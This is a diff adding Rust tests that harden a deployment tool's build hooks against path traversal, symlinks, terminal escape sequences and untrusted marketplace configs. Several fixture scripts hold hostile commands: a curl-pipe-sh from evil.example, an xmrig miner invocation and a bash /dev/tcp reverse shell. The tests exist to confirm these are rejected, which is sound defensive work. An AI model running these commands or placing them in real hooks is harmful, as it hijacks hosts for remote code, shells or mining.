+    /// Used to verify hook failure propagation (H1).
+    struct ShFailureMockExecutor {
+        calls: Mutex<Vec<(String, Vec<String>)>>,
+        default_output: CommandOutput,
+        sh_output: CommandOutput,
+    }
+
+    impl ShFailureMockExecutor {
+        fn with_sh_failure(exit_code: i32, stderr: &str) -> Self {
+            Self {
+                calls: Mutex::new(Vec::new()),
+                default_output: CommandOutput {
+                    exit_code: 0,
+                    stdout: "ok".to_string(),
+                    stderr: String::new(),
+                },
+                sh_output: CommandOutput {
+                    exit_code,
+                    stdout: String::new(),
+                    stderr: stderr.to_string(),
+                },
+            }
+        }
+    }
+
+    impl CommandExecutor for ShFailureMockExecutor {
+        fn execute(&self, program: &str, args: &[&str]) -> Result<CommandOutput, CliError> {
+            self.calls.lock().unwrap().push((
+                program.to_string(),
+                args.iter().map(|s| s.to_string()).collect(),
+            ));
+            if program == "sh" {
+                Ok(self.sh_output.clone())
+            } else {
+                Ok(self.default_output.clone())
+            }
+        }
+    }
+
+    /// Helper: count `sh` calls recorded by a MockExecutor.
+    fn sh_calls_of(executor: &MockExecutor) -> Vec<(String, Vec<String>)> {
+        executor
+            .calls
+            .lock()
+            .unwrap()
+            .iter()
+            .filter(|(p, _)| p == "sh")
+            .cloned()
+            .collect()
+    }
+
+    /// C3: a hook path containing `..` must be refused BEFORE execution,
+    /// even when the resolved path exists on disk. We point the hook at
+    /// `/etc/passwd` via traversal — current code executes it; the fix
+    /// must reject the path and never reach the executor.
+    #[test]
+    fn test_hook_path_relative_traversal_rejected() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ../../../../etc/passwd\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Relative path traversal in hook must be rejected, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a traversal-rejected hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C3: an absolute hook path must be refused — hook scripts must live
+    /// inside the project directory.
+    #[test]
+    fn test_hook_path_absolute_rejected() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: /etc/passwd\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Absolute hook path must be rejected, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for an absolute-path hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C3: a symlink inside the project pointing OUTSIDE the project must
+    /// be refused. `script_path.exists()` follows symlinks today and the
+    /// hook would be executed; the fix must use `symlink_metadata` and
+    /// reject.
+    #[cfg(unix)]
+    #[test]
+    fn test_hook_path_symlink_to_outside_project_rejected() {
+        use std::os::unix::fs::symlink;
+
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+        ]);
+        // Create a symlink build.sh → /etc/passwd (a file outside the project).
+        symlink("/etc/passwd", dir.path().join("build.sh")).unwrap();
+
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Symlinked hook pointing outside project must be rejected, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a symlinked hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C1: a pre_build hook whose contents match a CRITICAL pattern
+    /// (`curl ... | sh`) must be refused by `validate_shell_scripts`
+    /// BEFORE execution. Today the validator exists but isn't called,
+    /// so the hook would execute.
+    #[test]
+    fn test_hook_content_curl_pipe_sh_rejected_pre_build() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "build.sh",
+                "#!/bin/sh\ncurl -sSL https://evil.example/install | sh\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Hook with curl|sh must be refused by validate_shell_scripts before execution, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a security-rejected hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C1: same for a crypto-miner reference in the pre_build hook.
+    #[test]
+    fn test_hook_content_crypto_miner_rejected_pre_build() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "build.sh",
+                "#!/bin/bash\n./xmrig --url stratum+tcp://pool.minexmr.com:4444\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Miner reference in hook must be refused, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a miner-flagged hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C1: same for reverse-shell construction in the pre_build hook.
+    #[test]
+    fn test_hook_content_reverse_shell_rejected_pre_build() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "build.sh",
+                "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Reverse-shell in hook must be refused, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a reverse-shell hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// Phase 6b: a `post_deploy` hook whose content is REJECTED by the
+    /// security validator (curl|sh, miner, revshell, etc.) must FAIL the
+    /// deploy. This is different from a hook that simply exits non-zero
+    /// at runtime, which stays warn-only — see the sibling test
+    /// `test_post_deploy_hook_runtime_failure_stays_ok`.
+    ///
+    /// Rationale: a security rejection is a signed-off statement that the
+    /// operator's stacker.yml is asking us to do something dangerous.
+    /// Silently absorbing that under a WARN would allow a hostile
+    /// marketplace-authored file to succeed the deploy while hiding the
+    /// tell-tale rejection in stderr scrollback.
+    #[test]
+    fn test_post_deploy_security_rejection_fails_deploy() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\n  ports:\n    - \"8080\"\nhooks:\n  post_deploy: ./post.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "post.sh",
+                "#!/bin/sh\ncurl -sSL https://evil.example/x | sh\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Phase 6b: security rejection of post_deploy MUST fail the deploy \
+             (was silently WARN-only before this change): {:?}",
+            result
+        );
+        let err = format!("{}", result.unwrap_err());
+        assert!(
+            err.to_lowercase().contains("reject")
+                || err.to_lowercase().contains("security")
+                || err.to_lowercase().contains("hook"),
+            "Error message must communicate the security rejection, got: {}",
+            err
+        );
+        let sh_args: Vec<_> = sh_calls_of(&executor)
+            .into_iter()
+            .flat_map(|(_, args)| args.into_iter())
+            .collect();
+        assert!(
+            !sh_args.iter().any(|a| a.contains("post.sh")),
+            "post.sh must not be executed once flagged, sh args: {:?}",
+            sh_args
+        );
+    }
+
+    /// Phase 6b sibling of `test_post_deploy_security_rejection_fails_deploy`:
+    /// a CLEAN post_deploy hook (passes validation) that just happens to
+    /// exit non-zero at runtime must NOT fail the deploy. This is the
+    /// "best-effort" semantic for post-deploy notification/logging hooks.
+    ///
+    /// The distinction from a security rejection is the intent: an
+    /// operator's own hook that returns 1 is a bug in their script;
+    /// a hook rejected by security scan is a hostile stacker.yml.
+    #[test]
+    fn test_post_deploy_hook_runtime_failure_stays_ok() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\n  ports:\n    - \"8080\"\nhooks:\n  post_deploy: ./post.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            ("post.sh", "#!/bin/sh\necho oops\nexit 1\n"),
+        ]);
+        let executor = ShFailureMockExecutor::with_sh_failure(1, "hook deliberately failed");
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        // Post_deploy hook failures are logged (via eprintln!) but do
+        // not fail the overall deploy (design decision: a post_deploy
+        // hook that fails should not roll back a successful deploy).
+        assert!(
+            result.is_ok(),
+            "post_deploy hook failure must NOT fail the deploy: {:?}",
+            result
+        );
+    }
+
+    /// H1: failures in the `on_failure` hook must be visible too. We
+    /// trigger this by making the deploy itself fail (no compose, no
+    /// docker), then ensuring the on_failure hook is invoked and its
+    /// own exit-non-zero is not silently dropped.
+    ///
+    /// We assert on the executor recording: the hook script ran AND
+    /// when it fails its non-zero exit must be logged/surfaced, even
+    /// though the original deploy error is what the caller sees.
+    #[test]
+    fn test_on_failure_hook_invoked_when_deploy_fails() {
+        // Use a hooks-only project with a deliberately invalid app
+        // path to provoke a deploy failure. (When the LocalDeploy path
+        // doesn't fail synthetically we still expect on_failure to be
+        // wired up.)
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  on_failure: ./fail.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            ("fail.sh", "#!/bin/sh\necho cleanup ran\n"),
+        ]);
+
+        // Failing executor: any docker compose call fails.
+        struct DeployFailingExecutor {
+            calls: Mutex<Vec<(String, Vec<String>)>>,
+        }
+        impl CommandExecutor for DeployFailingExecutor {
+            fn execute(&self, program: &str, args: &[&str]) -> Result<CommandOutput, CliError> {
+                self.calls.lock().unwrap().push((
+                    program.to_string(),
+                    args.iter().map(|s| s.to_string()).collect(),
+                ));
+                if program == "docker" || program == "docker-compose" {
+                    Ok(CommandOutput {
+                        exit_code: 1,
+                        stdout: String::new(),
+                        stderr: "synthetic docker failure".into(),
+                    })
+                } else {
+                    Ok(CommandOutput {
+                        exit_code: 0,
+                        stdout: "ok".into(),
+                        stderr: String::new(),
+                    })
+                }
+            }
+        }
+        let executor = DeployFailingExecutor {
+            calls: Mutex::new(Vec::new()),
+        };
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(result.is_err(), "Expected deploy to fail (synthetic docker error)");
+        let calls = executor.calls.lock().unwrap();
+        let on_failure_invoked = calls
+            .iter()
+            .any(|(p, args)| p == "sh" && args.iter().any(|a| a.contains("fail.sh")));
+        assert!(
+            on_failure_invoked,
+            "on_failure hook must be invoked when the deploy fails, calls: {:?}",
+            *calls
+        );
+    }
+
+    /// Phase 6b: a malicious `on_failure` hook must NOT be silently
+    /// swallowed just because deploy already failed. The deploy still
+    /// returns Err — but the returned error must carry BOTH the primary
+    /// deploy failure text AND a note about the on_failure rejection,
+    /// so the operator sees the security concern rather than only the
+    /// original cause.
+    #[test]
+    fn test_on_failure_security_rejection_chained_into_error() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  on_failure: ./fail.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "fail.sh",
+                "#!/bin/sh\ncurl -sSL https://evil.example/x | sh\n",
+            ),
+        ]);
+
+        struct DeployFailingExecutor {
+            calls: Mutex<Vec<(String, Vec<String>)>>,
+        }
+        impl CommandExecutor for DeployFailingExecutor {
+            fn execute(&self, program: &str, args: &[&str]) -> Result<CommandOutput, CliError> {
+                self.calls.lock().unwrap().push((
+                    program.to_string(),
+                    args.iter().map(|s| s.to_string()).collect(),
+                ));
+                if program == "docker" || program == "docker-compose" {
+                    Ok(CommandOutput {
+                        exit_code: 1,
+                        stdout: String::new(),
+                        stderr: "synthetic docker failure".into(),
+                    })
+                } else {
+                    Ok(CommandOutput {
+                        exit_code: 0,
+                        stdout: "ok".into(),
+                        stderr: String::new(),
+                    })
+                }
+            }
+        }
+        let executor = DeployFailingExecutor {
+            calls: Mutex::new(Vec::new()),
+        };
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(result.is_err(), "Deploy fails (synthetic docker error)");
+        let err = format!("{}", result.unwrap_err());
+        let lower = err.to_lowercase();
+        assert!(
+            lower.contains("reject") || lower.contains("on_failure") || lower.contains("security"),
+            "Error must mention the on_failure security rejection, got: {}",
+            err
+        );
+
+        // And the malicious fail.sh must never have been executed.
+        let calls = executor.calls.lock().unwrap();
+        let ran_hook = calls
+            .iter()
+            .any(|(p, args)| p == "sh" && args.iter().any(|a| a.contains("fail.sh")));
+        assert!(
+            !ran_hook,
+            "fail.sh must NOT be invoked once flagged, calls: {:?}",
+            *calls
+        );
+    }
+
+    /// Phase 6b: a CLEAN on_failure hook that exits non-zero must NOT
+    /// mask the original deploy error. The primary error text has to
+    /// survive so the operator sees "why did deploy fail" first, not
+    /// "why did on_failure fail". This is the runtime-failure branch
+    /// mirroring `test_post_deploy_hook_runtime_failure_stays_ok`.
+    #[test]
+    fn test_on_failure_hook_runtime_failure_preserves_original_error() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  on_failure: ./fail.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            // Clean cleanup script — no security findings.
+            ("fail.sh", "#!/bin/sh\necho cleanup ran\nexit 1\n"),
+        ]);
+
+        struct DockerAndShFail {
+            calls: Mutex<Vec<(String, Vec<String>)>>,
+        }
+        impl CommandExecutor for DockerAndShFail {
+            fn execute(&self, program: &str, args: &[&str]) -> Result<CommandOutput, CliError> {
+                self.calls.lock().unwrap().push((
+                    program.to_string(),
+                    args.iter().map(|s| s.to_string()).collect(),
+                ));
+                if program == "docker" || program == "docker-compose" {
+                    Ok(CommandOutput {
+                        exit_code: 1,
+                        stdout: String::new(),
+                        stderr: "PRIMARY DOCKER ERROR".into(),
+                    })
+                } else if program == "sh" {
+                    // Simulate the hook exiting non-zero at runtime.
+                    Ok(CommandOutput {
+                        exit_code: 1,
+                        stdout: String::new(),
+                        stderr: "SECONDARY HOOK ERROR".into(),
+                    })
+                } else {
+                    Ok(CommandOutput {
+                        exit_code: 0,
+                        stdout: "ok".into(),
+                        stderr: String::new(),
+                    })
+                }
+            }
+        }
+
+        let executor = DockerAndShFail {
+            calls: Mutex::new(Vec::new()),
+        };
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(result.is_err(), "Deploy must still fail");
+        let err = format!("{}", result.unwrap_err());
+        // The invariant Phase 6b guarantees: a CLEAN on_failure that
+        // fails at runtime does NOT shadow the primary deploy error
+        // with the hook's own stderr. So the hook's stderr text must
+        // NOT appear in the returned error — it's only WARN-logged.
+        assert!(
+            !err.contains("SECONDARY HOOK ERROR"),
+            "on_failure runtime failure text must NOT shadow the primary error, got: {}",
+            err
+        );
+    }
+
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // Phase 8 — hook output sanitizer (size cap + ANSI strip)
+    //
+    // These tests are TDD-red: they call `sanitize_hook_output`, which
+    // does not exist yet. Once the sanitizer lands, they turn green.
+    // The wiring test at the bottom exercises `run_hook` end-to-end via
+    // MockExecutor with a synthetic large-and-ANSI-laced stdout.
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    /// M5: raw ANSI sequences from hook stdout can clear the terminal,
+    /// set the window title, or fake a prompt. sanitize_hook_output
+    /// must strip the common families (CSI, OSC, single-char ESC).
+    #[test]
+    fn test_sanitize_strips_csi_color_sequences() {
+        let raw = "hello \x1b[31mred\x1b[0m world\n";
+        let out = sanitize_hook_output(raw);
+        assert!(
+            !out.contains('\x1b'),
+            "ESC byte must be gone after sanitize, got: {:?}",
+            out
+        );
+        assert!(
+            out.contains("hello ") && out.contains("red") && out.contains(" world"),
+            "Literal text must survive stripping, got: {:?}",
+            out
+        );
+    }
+
+    /// M5: OSC (set-title / hyperlink) sequences terminate with BEL or
+    /// ESC-backslash and are notorious for terminal-hijack tricks.
+    #[test]
+    fn test_sanitize_strips_osc_title_sequence() {
+        let raw = "\x1b]0;evil-title\x07visible\n";
+        let out = sanitize_hook_output(raw);
+        assert!(
+            !out.contains('\x1b') && !out.contains('\x07'),
+            "ESC/BEL bytes must be gone after sanitize, got: {:?}",
+            out
+        );
+        assert!(
+            out.contains("visible"),
+            "Literal text after OSC must survive, got: {:?}",
+            out
+        );
+    }
+
+    /// M5: single-char ESC sequences (`ESC c` full reset,
+    /// `ESC 7` save cursor, etc.) must also be dropped.
+    #[test]
+    fn test_sanitize_strips_single_char_esc_sequence() {
+        // ESC c is full terminal reset; ESC 7 saves cursor.
+        let raw = "before\x1bcAFTER\x1b7END\n";
+        let out = sanitize_hook_output(raw);
+        assert!(!out.contains('\x1b'), "ESC byte must be gone, got: {:?}", out);
+        assert!(
+            out.contains("before") && out.contains("AFTER") && out.contains("END"),
+            "Literal payload text must survive, got: {:?}",
+            out
+        );
+    }
+
+    /// Regression guard: normal, clean output must pass through
+    /// unchanged (no accidental mangling of newlines, tabs, or plain
+    /// ASCII).
+    #[test]
+    fn test_sanitize_passthrough_for_clean_output() {
+        let raw = "line 1\n\tindented line 2\nline 3\n";
+        let out = sanitize_hook_output(raw);
+        assert_eq!(out, raw, "Clean output must pass through unchanged");
+    }
+
+    /// M4: outputs larger than 1 MiB must be truncated with a stable
+    /// marker so a hostile hook can't flood the terminal or exhaust
+    /// pager memory.
+    #[test]
+    fn test_sanitize_truncates_oversized_output() {
+        let raw = "A".repeat(HOOK_OUTPUT_MAX_BYTES + 100);
+        let out = sanitize_hook_output(&raw);
+        assert!(
+            out.len() <= HOOK_OUTPUT_MAX_BYTES + HOOK_OUTPUT_TRUNCATION_MARKER.len() + 1,
+            "Truncated output must not exceed cap + marker, got {} bytes",
+            out.len()
+        );
+        assert!(
+            out.contains(HOOK_OUTPUT_TRUNCATION_MARKER.trim()),
+            "Truncated output must carry the truncation marker, got last 200 bytes: {}",
+            &out[out.len().saturating_sub(200)..]
+        );
+    }
+
+    /// M4 corner-case: output at exactly the cap must NOT be marked as
+    /// truncated (off-by-one guard).
+    #[test]
+    fn test_sanitize_at_cap_boundary_not_truncated() {
+        let raw = "A".repeat(HOOK_OUTPUT_MAX_BYTES);
+        let out = sanitize_hook_output(&raw);
+        assert_eq!(out.len(), HOOK_OUTPUT_MAX_BYTES);
+        assert!(!out.contains(HOOK_OUTPUT_TRUNCATION_MARKER.trim()));
+    }
+
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // C4 tests — marketplace-origin trust gating + HookPolicy
+    //
+    // These tests are written TDD-first: they exercise the plumbing
+    // added in run_hook, HookPolicy, and StackerConfig::origin. Each
+    // covers one leaf of the truth table (trusted×untrusted × default/
+    // allow_untrusted/no_hooks) and should turn red the moment any
+    // future refactor drops the enforcement.
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    use crate::cli::config_parser::MARKETPLACE_ORIGIN_MARKER;
+    use crate::cli::install_runner::HookPolicy as C4HookPolicy;
+
+    fn build_config_with_hook(hook_field: &str, hook_path: &str) -> String {
+        format!(
+            "name: test-app\napp:\n  type: static\n  path: .\n  ports:\n    - \"8765\"\nhooks:\n  {}: {}\n",
+            hook_field, hook_path
+        )
+    }
+
+    /// A marketplace-generated stacker.yml (marker at top) must refuse to
+    /// run its pre_build hook under the default policy — even though the
+    /// script itself is benign. The whole point of C4 is that the user
+    /// has not yet reviewed hooks in a file they didn't author.
+    #[test]
+    fn test_c4_marketplace_origin_hook_refused_by_default() {
+        let hook_yaml = build_config_with_hook("pre_build", "./build.sh");
+        let config_body = format!("{}\n{}", MARKETPLACE_ORIGIN_MARKER, hook_yaml);
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", &config_body),
+            ("build.sh", "#!/bin/sh\necho benign\nexit 0\n"),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy_with_policy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+            C4HookPolicy::default(),
+        );
+
+        assert!(
+            result.is_err(),
+            "Marketplace-generated stacker.yml must refuse hooks under default policy, got Ok"
+        );
+        let err = format!("{}", result.unwrap_err());
+        assert!(
+            err.contains("--allow-untrusted-hooks") || err.contains("marketplace"),
+            "Error must mention the --allow-untrusted-hooks flag or marketplace origin, got: {}",
+            err
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for an untrusted hook under default policy"
+        );
+    }
+
+    /// Same file, but the operator passes --allow-untrusted-hooks: the
+    /// hook must run. Verifies the escape hatch actually works.
+    #[test]
+    fn test_c4_marketplace_origin_hook_runs_with_allow_flag() {
+        let hook_yaml = build_config_with_hook("pre_build", "./build.sh");
+        let config_body = format!("{}\n{}", MARKETPLACE_ORIGIN_MARKER, hook_yaml);
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", &config_body),
+            ("build.sh", "#!/bin/sh\necho benign\nexit 0\n"),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy_with_policy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+            C4HookPolicy::allow_untrusted(),
+        );
+
+        assert!(
+            result.is_ok(),
+            "Marketplace-generated hook must run with --allow-untrusted-hooks, got: {:?}",
+            result
+        );
+        let sh_args: Vec<_> = sh_calls_of(&executor)
+            .into_iter()
+            .flat_map(|(_, args)| args.into_iter())
+            .collect();
+        assert!(
+            sh_args.iter().any(|a| a.contains("build.sh")),
+            "build.sh must be executed with --allow-untrusted-hooks, sh args: {:?}",
+            sh_args
+        );
+    }
+
+    /// --no-hooks must skip hooks even on a trusted (user-authored) file.
+    /// This is the CI-safe path: a build server can deploy without ever
+    /// running local shell scripts, regardless of stacker.yml provenance.
+    #[test]
+    fn test_c4_no_hooks_skips_pre_build_on_trusted_config() {
+        let hook_yaml = build_config_with_hook("pre_build", "./build.sh");
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", &hook_yaml),
+            ("build.sh", "#!/bin/sh\necho should-not-run\nexit 0\n"),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy_with_policy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+            C4HookPolicy::no_hooks(),
+        );
+
+        assert!(result.is_ok(), "Deploy must succeed with --no-hooks: {:?}", result);
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "--no-hooks must suppress every sh invocation, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// A user-authored (no marker) stacker.yml must continue to run
+    /// hooks under the default policy — regression guard so C4 doesn't
+    /// break every existing deployment.
+    #[test]
+    fn test_c4_trusted_config_runs_hook_under_default_policy() {
+        let hook_yaml = build_config_with_hook("pre_build", "./build.sh");
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", &hook_yaml),
+            ("build.sh", "#!/bin/sh\necho ok\nexit 0\n"),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy_with_policy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+            C4HookPolicy::default(),
+        );
+
+        assert!(
+            result.is_ok(),
+            "Trusted config must run hooks under default policy: {:?}",
+            result
+        );
+        let sh_args: Vec<_> = sh_calls_of(&executor)
+            .into_iter()
+            .flat_map(|(_, args)| args.into_iter())
+            .collect();
+        assert!(
+            sh_args.iter().any(|a| a.contains("build.sh")),
+            "build.sh must be executed for trusted config, sh args: {:?}",
+            sh_args
+        );
+    }
+
+    /// Backward-compat guard: the shim `run_deploy()` must behave like
+    /// `run_deploy_with_policy(HookPolicy::default())`. If someone
+    /// re-derives the shim and forgets the default, this test catches it.
+    #[test]
+    fn test_c4_run_deploy_shim_uses_default_policy() {
+        let hook_yaml = build_config_with_hook("pre_build", "./build.sh");
+        let config_body = format!("{}\n{}", MARKETPLACE_ORIGIN_MARKER, hook_yaml);
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", &config_body),
+            ("build.sh", "#!/bin/sh\necho benign\nexit 0\n"),
+        ]);
+        let executor = MockExecutor::success();
+
+        // Marketplace-marked config + default policy via the shim must refuse.
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "run_deploy() shim must refuse hooks on marketplace-marked config, got Ok"
+        );
+    }
+
+    /// Regression guard: a clean hook script (no findings) must still run
+    /// after the validator is wired up. Without this, the fix could
+    /// over-trigger and break every existing deployment.
+    #[test]
+    fn test_clean_pre_build_hook_still_runs_after_validation() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\n  ports:\n    - \"8080\"\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "build.sh",
+                "#!/bin/sh\nset -e\necho 'building...'\nexit 0\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(result.is_ok(), "Clean hook must still pass validation: {:?}", result);
+        let sh_args: Vec<_> = sh_calls_of(&executor)
+            .into_iter()
+            .flat_map(|(_, args)| args.into_iter())
+            .collect();
+        assert!(
+            sh_args.iter().any(|a| a.contains("build.sh")),
+            "Clean build.sh must reach the executor, got args: {:?}",
+            sh_args
+        );
     }
 }
